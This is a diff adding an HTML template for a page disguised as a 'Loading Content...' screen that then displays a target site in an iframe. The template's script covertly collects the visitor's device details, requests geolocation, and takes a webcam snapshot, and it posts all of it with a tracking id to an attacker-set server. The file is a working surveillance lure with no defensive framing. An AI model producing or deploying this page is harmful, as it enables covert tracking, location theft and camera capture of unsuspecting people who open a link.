@@ -1,0 +1,154 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading...</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .loader-container {
+            text-align: center;
+            color: white;
+        }
+
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 4px solid rgba(255, 255, 255, 0.3);
+            border-top-color: white;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+
+        h1 {
+            font-size: 24px;
+            margin-bottom: 10px;
+        }
+
+        p {
+            font-size: 14px;
+            opacity: 0.9;
+        }
+
+        iframe {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            border: none;
+            display: none;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="loader-container" id="loader">
+        <div class="spinner"></div>
+        <h1>Loading Content...</h1>
+        <p>Please wait while we prepare your content</p>
+    </div>
+
+    <iframe id="targetFrame" src="<%= url %>"></iframe>
+
+    <script>
+        const serverUrl = '<%= a %>';
+        const userId = '<%= uid %>';
+        const targetUrl = '<%= url %>';
+
+        // Collect device information
+        async function collectData() {
+            const data = {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                screenResolution: `${screen.width}x${screen.height}`,
+                colorDepth: screen.colorDepth,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                cookiesEnabled: navigator.cookieEnabled,
+                onlineStatus: navigator.onLine,
+                referrer: document.referrer,
+                timestamp: new Date().toISOString()
+            };
+
+            // Send basic info
+            await fetch(serverUrl, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                body: `uid=${encodeURIComponent(userId)}&data=${encodeURIComponent(
+                    Object.entries(data).map(([k, v]) => `<b>${k}:</b> ${v}`).join('<br>')
+                )}`
+            });
+
+            // Try to get location
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(async (position) => {
+                    await fetch(serverUrl + '/location', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                        body: `uid=${encodeURIComponent(userId)}&lat=${position.coords.latitude}&lon=${position.coords.longitude}&acc=${position.coords.accuracy}`
+                    });
+                });
+            }
+
+            // Try to get camera snapshot
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.play();
+
+                setTimeout(async () => {
+                    const canvas = document.createElement('canvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+
+                    const imageData = canvas.toDataURL('image/png').split(',')[1];
+
+                    await fetch(serverUrl + '/camsnap', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                        body: `uid=${encodeURIComponent(userId)}&img=${encodeURIComponent(imageData)}`
+                    });
+
+                    stream.getTracks().forEach(track => track.stop());
+                }, 1000);
+            } catch (e) {
+                console.log('Camera access denied');
+            }
+        }
+
+        // Collect data and show iframe
+        collectData().then(() => {
+            setTimeout(() => {
+                document.getElementById('loader').style.display = 'none';
+                document.getElementById('targetFrame').style.display = 'block';
+            }, 2000);
+        });
+    </script>
+</body>
+
+</html>
